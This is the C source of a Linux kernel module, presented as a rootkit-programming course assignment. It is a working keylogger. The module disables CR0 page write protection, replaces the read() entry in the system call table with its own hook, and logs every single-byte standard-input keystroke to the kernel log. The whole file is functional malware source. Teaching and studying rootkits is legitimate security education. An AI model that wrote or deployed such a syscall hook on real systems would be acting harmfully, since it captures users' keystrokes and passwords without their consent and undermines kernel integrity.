/*
 * Assignment 02 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/page.h>
#include "sysmap.h"
#include <linux/moduleparam.h>
#include <linux/unistd.h>

void **sys_call_table;

asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);

/*
 * Our manipulated read syscall. It will print every keystroke to the syslog
 * and call the original read afterwards.
 */
asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	ret = original_read(fd,buf,count);
	
	//read from stdin and print it using printk
	if(count == 1  && fd==0)
	{
		printk(KERN_INFO "[Keylogger] '%c' (0x%02x)\n", buf[0], buf[0]);
	}

	return ret;
}

/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection(void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection(void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and replaces the read() syscall.
 */
int init_module(void)
{
	printk(KERN_INFO "Loading keylogger LKM...\n");
	
	/* get the location of the sys_call_table from our sysmap.h file */
	sys_call_table = (void*) sysmap_sys_call_table;
	
	/* disable the write-protection */
	disable_page_protection();
	
	/* 
	 * keep pointer to original function in original_read, and 
	 * replace the system call in the system call table with
	 * manipulated_read 
	 */
	original_read = (void *)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long*)manipulated_read;
	
	/* reenable the write-protection */
	enable_page_protection();	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the original read() syscall.
 */
void cleanup_module(void)
{
	printk(KERN_INFO "Unloading keylogger... bye!\n");

	/* disable the write-protection */	
	disable_page_protection();

	/* Return the system call back to original */
	sys_call_table[__NR_read] = (unsigned long *)original_read;

	/* reenable the write-protection */
	enable_page_protection();	
}
